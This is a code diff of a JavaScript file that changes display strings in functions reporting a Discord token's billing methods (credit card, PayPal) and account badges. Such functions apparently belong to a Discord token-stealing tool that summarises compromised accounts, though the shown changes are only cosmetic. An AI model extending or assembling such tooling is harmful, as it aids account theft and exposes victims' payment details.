@@ -522,10 +522,10 @@ const getBilling = async (token) => {
     if (!x.invalid) {
       switch (x.type) {
         case 1:
-          billing += "💳 ";
+          billing += "Credit Card 💳, ";
           break;
         case 2:
-          billing += `${config.emojis.paypal} `;
+          billing += `Paypal ${config.emojis.paypal}, `;
           break;
       }
     }
@@ -604,34 +604,34 @@ const getBadges = (flags) => {
   let badges = "";
   switch (flags) {
     case 1:
-      badges += "<:Discord_Staff:990730713731072070> ";
+      badges += "Staff <:Discord_Staff:990730713731072070>, ";
       break;
     case 2:
-      badges += "<:discord_partner:990730711331905537> ";
+      badges += "Partener <:discord_partner:990730711331905537>, ";
       break;
     case 131072:
-      badges += "<:Verified_Bot_Developer:990730730151772181> ";
+      badges += "Verified Bot <:Verified_Bot_Developer:990730730151772181>, ";
       break;
     case 4:
-      badges += "<:HypeSquad_Event:990730723940007956> ";
+      badges += "HypeSquad Event <:HypeSquad_Event:990730723940007956>, ";
       break;
     case 16384:
-      badges += "<:Bug_Hunter_level2:990730708001648660> ";
+      badges += "Hunter lvl2 <:Bug_Hunter_level2:990730708001648660>, ";
       break;
     case 8:
-      badges += "<:Bug_Hunter:990730706042888192> ";
+      badges += "Hunter <:Bug_Hunter:990730706042888192>, ";
       break;
     case 512:
-      badges += "<:EarlySupporter:990727673783390239> ";
+      badges += "Early <:EarlySupporter:990727673783390239>, ";
       break;
     case 128:
-      badges += "<:HypeSquad_Brilliance:990730721620557865> ";
+      badges += "<:HypeSquad_Brilliance:990730721620557865>, ";
       break;
     case 64:
-      badges += "<:HypeSquad_Bravery:990730719674380420>";
+      badges += "<:HypeSquad_Bravery:990730719674380420>, ";
       break;
     case 256:
-      badges += "<:HypeSquad_Balance:990730717820506122> ";
+      badges += "<:HypeSquad_Balance:990730717820506122>, ";
       break;
     case 0:
       badges = "`No Badges`";
